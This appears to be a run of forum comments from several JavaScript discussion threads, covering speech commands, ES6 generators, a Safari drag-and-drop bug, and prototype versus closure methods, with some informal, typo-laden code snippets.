I love it, now... what happens when you simulate on top of a picture raindrops...
Hello!
You can also annyang-&gt;setLanguage('nl-NL') and write commands in Dutch... or any other language.
How do we know those constants weren't put there by the NSA?! I'm worried every time I see a particular constant in the code... uint64_t h1 = seed; uint64_t h2 = seed; uint64_t c1 = BIG_CONSTANT(0x87c37b91114253d5); uint64_t c2 = BIG_CONSTANT(0x4cf5ad432745937f);
Could someone please ELI5 what this does and what it would be used for? I'm not exactly a beginner but I have very little experience with ES6 and generators.
Yeah, same. I've heard a lot on either side of the issue (flask is great vs flask is only for small projects), but I like the concept of taking something minimal and adding modules to create what you need, rather than taking something like rails or django and 'stripping it down'. Not sure if that's totally fair to django/rails since I haven't used them extensively.
I really like the idea of having generators in JS. They are super powerful. But we need to get some good practices around their use. It is really easy to write spaghetti code if you aren't careful; the similar to linters warning about having a case in a switch statement without a break. To that end, here's what I am uncomfortable with, please tell me why I'm wrong: - Async logic is hard to read and debug, especially with recursion (need better tooling?). - Channels break when the Consumer or Producer forgets the yield keyword. - Channels in JS may be async, but are not multithreaded, so a busy generator can starve the other channels without warning. This is not the case in other implementations (specifically Go). What I LOVE about this is what it could mean for promises, callbacks, and events. This could greatly simplify the APIs exposed from libraries which require async logic (e.g., write your code procedurally, but the implementation is async).
Looks neat! For me, fails with the following error. I'm using the latest seed of Safari 6.1. &gt; TypeError: 'null' is not an object (evaluating 'event.dataTransfer.getData('text/html').match(/src=["'](.+?)['"]/)[1]') Line 305 in `application.js`. Edit: This is using your demo picture; when doing a proper drag-n-drop of an actual image, it works fine.
now let's make one with alert prompts!
"rich hypermedia" is buzzword filler text. Let's rewrite it! Fortune is a framework for the JSON API specification with MongoDB support and an adapter for MySQL, Postgres, &amp; SQLite (see guide for how to use).
Thanks for finding that. I'll get to it first thing after work. Edit: Turns out this feature isn't yet supported in Safari. ); Gotta wait for it.
Both implementations (as well as a few others, the singleton pattern, for example) have their (dis)advantages. Prototypical methods can be applied to all objects derived from the same constructor even after their creation, with incredibly low performance impact. On the other hand, discrete methods are hidden from manipulations from outside of the scope and their addressing is a wee bit faster than their prototypical counterparts. Therefore, you need to see both as tools you'll have to find fit depending on every situation you encounter. If security or call speed are important, use a discrete method, if you want flexibility and go easy on the RAM for a multitude of objects, use the prototype.
In this case, I am not too concerned about security for this class I am writing. I have noticed that when I use approach 1, I cannot see the method on the IDE (eclipse). when using prototype, I can see the method on the IDE. It seems that if I want the class to be a library, I would be better off using the prototype approach since the users can get the method displayed for auto completion in eclipse (maybe it is eclipse only that does now 'know' how to find attribute functions?) Thank you for the reply.
Awesome! KO is amazing and doesn't require DSLs for templat'ing. Thanks for the good read.
With modern browsers, the runtime call performance difference is almost 0 (write a benchmark and test it out). Memory wise, the difference can be huge if you are going to instantiate many objects, and this means that the garbage collector will "stop the world" for enough time to ruin the user experience. Since both methods are blazingly fast, and they are not going to be the bottleneck for sure, I'd go with the prototype way, and save memory, every day. Where execution performance is premiere, I'd avoid the function call, inlining the operations performed by the method directly in the calling loop. Then you will have a huge performance boost, without wasting precious memory. Edit: in general, micro optimizations like this are not worth doing, because you will see huge differences across browsers and browsers versions. What is the fastest solution in chrome maybe is the slowest in FireFox. It is better to work on the quality of the algorithms you use. A O(n^2) hyper-micro-optimized solution will be blown away by an unoptimized O(n·logn) solution.
I think you forgot to add the "this." in your example. Otherwise method_1 in the first example is not accessible outside of the function my_class.
The difference is that functions on the prototype are not duplicated for each instance. An alternative version of #2 would be: function Dog() {...} Dog.prototype = { bark: function() {...}, eat: function() {...} };
Interesting... Once I added the 'this', as you suggested, eclipse can suggest the method. Thanks! 
&gt; I'd avoid the function call, inlining the operations performed How do you inline methods in JavaScript? If you can, please write an example. Thank you. 
Manually.
 console.log( function() { return 'Hi, I'm an inline function!'; });
Just a word of warning, o.prototype = {} has a hidden gotcha var C = function() {} C.prototype.constructor === C //true C.prototype = {} C.prototype.consturctor === C //false obvious fix would be to do C.prorotype.consturctor = C but If i'm using a underscore-like library I usually do _.extend(C.prototype, {})
I think that's just an eclipse problem. I'm fairly certain Intellij (and the other Jetbrains IDEs that support JS) can detect the methods even when not on a prototype.
I prefer English over Dutch as long as it interprets my English correctly :)
I don't think that's what the guy was saying. I'm pretty sure by inlining he meant instead of doing this: var add = function(a, b){return a+b}; for(var i = 0; i &lt; 100; i++){ add(i, i*); } You would do this: for(var i = 0; i &lt; 100; i++){ i + i*2; } It's an extremely simple example, but I think it shows what /u/mikrosystheme was talking about.